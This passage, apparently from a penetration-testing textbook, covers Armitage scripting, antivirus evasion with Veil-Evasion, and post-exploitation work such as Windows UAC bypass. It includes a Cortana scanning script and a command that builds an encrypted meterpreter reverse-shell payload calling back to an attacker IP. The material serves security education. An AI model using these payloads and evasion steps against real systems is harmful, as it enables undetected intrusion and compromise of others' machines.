chat room, and the log keeps a permanent record of all comments.
Scripting the Armitage attack
Armitage includes the Cortana scripting language, which is based on Sleep, an
extensible language that resembles Perl. Cortana scripts may define keyboard
shortcuts, insert menus, and create unique user interfaces.
Scripts may be run as standalone entities (which requires that the Armitage team
server be active) or directly from Armitage. To load an existing script, select
Armitage in the main menu bar, and then select Scripts. A tabbed view will open
and a button will give you the option to load a script.
Armitage also provides a scripting environment which is invoked from the View |
Script Console tab of the menu, as seen in the following screenshot:
[ 108 ]
Chapter 4
A sample script to fully scan target systems using the Metasploit Framework could
be written as scanner.cna. Whenever a new host is added (host_add), the MSF port
scanner will scan for a defined list of TCP ports and for available UDP ports. Take a
look at the following code snippet, which shows the scanner script:
# MSF port scanner
onhost_add {
println("[*] MSF Port Scanner New Host OpenPorts on$1");
$console = console();
cmd($console, "use auxiliary/scanner/portscan/tcp");
cmd($console, "set THREADS 12");
cmd($console, "set PORTS 139, 143");
# enter other ports as required
cmd($console, "set RHOSTS $1");
cmd($console, "run -j");
cmd($console, "use auxiliary/scanner/discovery/udp_sweep");
cmd($console, "set THREADS 12");
cmd($console, "set BATCHSIZE 256");
cmd($console, "set RHOSTS $1");
cmd($console, "run -j");
db_sync();
}
Because Cortana has extensive hooks into the Metasploit Framework, scripts can be
used to automatically launch exploits, conduct post-exploitation activities, such as
tracking user activity, and facilitate multiuser activities across the attacker's kill chain.
[ 109 ]
Exploit
Bypassing IDs and antivirus detection
The exploitation phase of the kill chain is the most dangerous one for the penetration
tester or attacker—they are directly interacting with the target network or system
and there is a great chance for their activity to be logged or their identity discovered.
Again, stealth must be employed to minimize risks to the tester. Although no specific
methodology or tool is undetectable, there are some configuration changes and
specific tools that will make detection more difficult.
When considering remote exploits, most networks and systems employ various
types of defensive controls to minimize the risk of attack. Network devices include
routers, firewalls, intrusion detection and prevention systems, and malware
detection software.
To facilitate exploitation, most frameworks incorporate features to make the attack
somewhat stealthy. The Metasploit Framework allows you to manually set evasion
factors on an exploit-by-exploit basis; however, determining which factors (such
as encryption, port number, filenames, and others) can be difficult and change for
each particular ID. The Metasploit Framework also allows communication between
the target and the attacking systems to be encrypted (the windows/meterpreter/
reverse_tcp_rc4 payload), making it difficult for the exploit payload to be detected.
Metasploit Pro, available as a trial on the Kali distribution, includes the following to
specifically bypass intrusion detection systems:
• Scan speed can be adjusted in the settings for Discovery Scan, reducing the
interaction speed with the target by setting the speed to sneaky or paranoid
• Implement transport evasion by sending smaller TCP packets and increasing
the transmission time between the packets
• Reducing the number of simultaneous exploits launched against a
target system
• Application-specific evasion options for exploits that involve DCERPC,
HTTP, and SMB can be automatically set
Most antivirus software rely on signature matching to locate viruses and other
malware. They examine each executable for strings of code known to be present in
viruses (the signature) and create an alarm when a suspect string is detected. Many
of Metasploit's attacks rely on files that may possess a signature that, over time, has
been identified by antivirus vendors.
In response to this, the Metasploit Framework allows standalone executables to be
encoded to bypass detection. Unfortunately, extensive testing of these executables at
public sites, such as virustotal.com, have lessened their effectiveness in bypassing
the AV software.
[ 110 ]
Chapter 4
A new AV-evasion framework, written by Chris Truncer, called Veil-Evasion
(www.Veil-Evasion.com), is now providing effective protection against the
detection of standalone exploits. Veil-Evasion aggregates various shellcode injection
techniques into a framework that simplifies management.
As a framework, Veil-Evasion possesses several features, which includes
the following:
• It incorporates custom shellcode in a variety of programming languages,
including C, C#, and Python
• It can use Metasploit-generated shellcode
• It can integrate third-party tools such as Hyperion (encrypts an EXE file with
AES-128 bit encryption), PEScrambler, and BackDoor Factory
• The Veil-Evasion_evasion.cna script allows for Veil-Evasion to be
integrated into Armitage and its commercial version, Cobalt Strike
• Payloads can be generated and seamlessly substituted into all PsExec calls
• Users have the ability to reuse shellcode or implement their own
encryption methods
• It's functionality can be scripted to automate deployment
• Veil-Evasion is under constant development and the framework has
been extended with modules such as Veil-Evasion-Catapult (the payload
delivery system)
Veil-Evasion can generate an exploit payload; the standalone payloads include the
following options:
• Minimal Python installation to invoke shellcode; it uploads a minimal
Python.zip installation and the 7zip binary. The Python environment is
unzipped, invoking the shellcode. Since the only files that interact with the
victim are trusted Python libraries and the interpreter, the victim's AV does
not detect or alarm on any unusual activity.
• Sethc backdoor, which configures the victim's registry to launch the sticky
keys RDP backdoor.
• PowerShell shellcode injector.
When the payloads have been created, they can be delivered to the target in one of
the following two ways:
• Upload and execute using Impacket and PTH toolkit
• UNC invocation
[ 111 ]
Exploit
Veil-Evasion is available from the Kali repositories, such as Veil-Evasion, and it is
automatically installed by simply entering apt-get install veil-evasion in a
command prompt.
If you receive any errors during installation, re-run the
/usr/share/veil-evasion/setup/setup.sh script.
Veil-Evasion presents the user with the main menu, which provides the number of
payload modules that are loaded as well as the available commands. Typing list
will list all available payloads, list langs will list the available language payloads,
and list  will list the payloads for a specific language. Veil-Evasion's
initial launch screen is shown in the following screenshot:
[ 112 ]
Chapter 4
Veil-Evasion is undergoing rapid development with significant releases on a
monthly basis and important upgrades occurring more frequently. Presently, there
are 24 payloads designed to bypass antivirus by employing encryption or direct
injection into the memory space. These payloads are shown in the next screenshot:
[ 113 ]
Exploit
To obtain information on a specific payload, type info or info  to autocomplete the payloads that are available. You can also
just enter the number from the list. In the following example, we entered 19 to select
the python/shellcode_inject/aes_encrypt payload:
The exploit includes an expire_payload option. If the module is not executed by
the target user within a specified timeframe, it is rendered inoperable. This function
contributes to the stealthiness of the attack.
The required options include the name of the options as well as the default values
and descriptions. If a required value isn't completed by default, the tester will need
to input a value before the payload can be generated. To set the value for an option,
enter set  and then type the desired value. To accept the default
options and create the exploit, type generate in the command prompt.
If the payload uses shellcode, you will be presented with the shellcode menu, where
you can select msfvenom (the default shellcode) or a custom shellcode. If the custom
shellcode option is selected, enter the shellcode in the form of \x01\x02, without
quotes and newlines (\n). If the default msfvenom is selected, you will be prompted
with the default payload choice of windows/meterpreter/reverse_tcp. If you wish
to use another payload, press Tab to complete the available payloads. The available
payloads are shown in the following screenshot:
[ 114 ]
Chapter 4
In the following example, the [tab] command was used to demonstrate some of the
available payloads; however, the default (windows/meterpreter/reverse_tcp) was
selected, as shown in the following screenshot:
[ 115 ]
Exploit
The user will then be presented with the output menu with a prompt to choose
the base name for the generated payload files. If the payload was Python-based
and you selected compile_to_exe as an option, the user will have the option
of either using Pyinstaller to create the EXE file, or generating Py2Exe files,
as shown in the following screenshot:
The final screen displays information on the generated payload, as shown in the
following screenshot:
The exploit could also have been created directly from a command line using the
following options:
kali@linux:~./Veil-Evasion.py -p python/shellcode_inject/
aes_encrypt -o -output --msfpayload windows/meterpreter/
reverse_tcp --msfoptions LHOST=192.168.43.134 LPORT=4444
[ 116 ]
Chapter 4
Once an exploit has been created, the tester should verify the payload against
VirusTotal to ensure that it will not trigger an alert when it is placed on the target
system. If the payload sample is submitted directly to VirusTotal and it's behavior
flags it as malicious software, then a signature update against the submission can
be released by antivirus (AV) vendors in as little as one hour. This is why users are
clearly admonished with the message "don't submit samples to any online scanner!"
Veil-Evasion allows testers to use a safe check against VirusTotal. When any payload
is created, a SHA1 hash is created and added to hashes.txt, located in the ~/veil-
output directory. Testers can invoke the checkvt script to submit the hashes to
VirusTotal, which will check the SHA1 hash values against its malware database. If a
Veil-Evasion payload triggers a match, then the tester knows that it may be detected
by the target system. If it does not trigger a match, then the exploit payload will
bypass the antivirus software. A successful lookup (not detectable by AV) using the
checkvt command is shown as follows:
Testing, thus far supports the finding that if checkvt does not find a match on
VirusTotal, the payload will not be detected by the target's antivirus software. To
use with the Metasploit Framework, use exploit/multi/handler and set PAYLOAD
to be windows/meterpreter/reverse_tcp (the same as the Veil-Evasion payload
option), with the same LHOST and LPORT used with Veil-Evasion as well. When the
listener is functional, send the exploit to the target system. When the listeners launch
it, it will establish a reverse shell back to the attacker's system.
[ 117 ]
Exploit
Summary
In this chapter, we focused on exploits as the tool that converts the findings from
reconnaissance into a defined action that establishes access between the tester and
the target.
Kali provides several tools to facilitate the development, selection, and activation
of exploits, including the internal exploit-db database as well as several frameworks
that simplify the use and management of the exploits. Among these frameworks, the
Metasploit Framework and Armitage are particularly important; however,
Veil-Evasion enhances both with its ability to bypass antivirus detection.
The next two chapters focus on the most important part of the attacker's kill chain—the
post-exploitation activities. This is the part of the attack where the attackers achieve
their objective. Typical post-exploitation activities include theft and exfiltration of data
(proprietary or financial information), horizontal escalation by taking advantage of
poor access controls, and vertical escalation by theft of user credentials.
[ 118 ]
Post Exploit – Action
on the Objective
In the modern world of hacking and system attacks, attackers are not as concerned
with exploitation as they are with what can be done with that access. This is the part
of the kill chain where the attacker achieves the full value of the attack.
Once a system has been compromised, the attacker generally performs the
following activities:
• Conducts a rapid assessment to characterize the local environment
(infrastructure, connectivity, accounts, presence of target files, and
applications that can facilitate further attacks)
• Locates and copies or modifies target files of interest, such as datafiles
(proprietary data and financial information)
• Creates additional accounts and modifies the system to support
post-exploitation activities
• Attempts to vertically escalate the privilege level used for access by
capturing administrator or system-level credentials
• Attempts to attack other data systems (horizontal escalation) by pivoting the
attack through the compromised system to the remainder of the network
• Installs persistent backdoors and covert channels to retain control and have
secure communications with the compromised system (this is covered in
Chapter 6, Post Exploit – Persistence)
• Removes indications of the attack from the compromised system
To be successful, the post-exploit activities require comprehensive knowledge of the
target's operating system and file structure to ensure that protective controls can be
bypassed. The first post-exploitation step is a reconnaissance of the compromised
system in the context of the local network.
Post Exploit – Action on the Objective
In this chapter, you will learn the following:
• How to bypass Windows User Account Control (UAC)
• How to conduct a rapid reconnaissance of a compromised system
• How to obtain sensitive data from a compromised system (pillaging)
• How to create additional accounts
• How to use Metasploit Framework to conduct post-exploitation activities
• Vertical and horizontal escalation techniques to improve your access rights
and increase the number of compromised accounts
• How to use anti-forensic techniques to cover your tracks and prevent the
compromise from being discovered
Bypassing Windows User Account
Control
In Windows Vista and higher versions, Microsoft introduced security controls to
restrict processes from running at three different integrity levels: high, medium, and
low. A high integrity process has administrator rights, a medium-level process runs
with a standard user's rights, and a low integrity process is restricted, enforcing that
programs do minimal damage if they are compromised.
To perform any privileged actions, a program must run as an administrator and
comply with the UAC settings. The four UAC settings are as follows:
• Always notify: This is the most stringent setting, and it will prompt the local
user whenever any program wants to use higher level privileges.
• Notify me only when programs try to make changes to my computer:
This is the default UAC setting. It does not prompt the user when a native
Windows program requests higher level privileges. However, it will prompt
if a third-party program wants elevated privileges.
• Notify me only when programs try to make changes to my computer
(don't dim my desktop): This is the same as the default setting, but it does
not dim the system's monitor when prompting the user.
• Never notify: This option reverts the system to pre-Vista days. If the user is
an administrator, all programs will run with high integrity.
[ 120 ]
Chapter 5
Therefore, immediately after exploitation, the tester (and attacker) wants to know the
following two things:
• Who is the user that the system has identified?
• What rights do they have on the system?
This can be determined using the following command:
C:\> whoami /groups
A compromised system is operating in a high-integrity context, as shown by the
Mandatory Label\High Mandatory Level Label in the following screenshot:
If the Label is Mandatory Label\Medium Mandatory Level, the tester will need
to elevate from standard user privileges to administrator rights for many of the
post-exploit steps to be successful.
The first option to elevate privileges is to run exploit/windows/local/ask,
from Metasploit, which launches the RunAs attack. This will create an executable
that, when invoked, will run a program to request elevated rights. The executable
should be created using the EXE::Custom option or encrypted using Veil-Evasion
to avoid detection by the local antivirus.
The disadvantage of the RunAs attack is that the user will be prompted that a
program from an unknown publisher wants to make changes to the computer.
This alert may cause the privilege escalation to be identified as an attack.
[ 121 ]
Post Exploit – Action on the Objective
If the system's current user is in an administrator's group, and if the UAC is
set to the default Notify me only when programs try to make changes to my
computer (it will not work if set to Always Notify), an attacker will be able to use the
Metasploit exploit/windows/local/bypassuac module to elevate their privileges.
The bypassuac module creates multiple artifacts on the target system and can be
recognized by most antivirus software. However, the exploit/windows/local/
bypassuac_inject module places the executable directly into a reflective DLL
running in memory, and it does not touch the hard disk, minimizing the opportunity
for detection by the antivirus software.
Some caveats when attempting to bypass the UAC controls are as follows:
• Bypass UAC attacks do not work against Windows Vista where the user
needs to acknowledge every privileged access.
• Windows 8 remains vulnerable to this attack. However, Metasploit
Framework attack does not presently work with Windows 8.1. If it is
attempted, the user will be prompted to click on an OK button before the
attack can obtain elevated privileges—which is hardly a stealthy attack.
Attackers can modify the attack by selecting to use exploit/windows/
local/ask, which will improve the chance of success.
• When considering system-to-system movement (horizontal/lateral
escalation), and if the current user is a domain user with local admin
privileges on other systems, you can use the existing authentication token
to gain access and bypass UAC. A common attack to achieve this is the
Metasploit exploit/windows/local/current_user_psexec.
Conducting a rapid reconnaissance of
a compromised system
Once a system has been compromised, the attacker needs to gain critical information
about that system, its network environment, users, and user accounts. Usually,
they will enter a series of commands or a script invoking these commands from
the shell prompt.
[ 122 ]
Chapter 5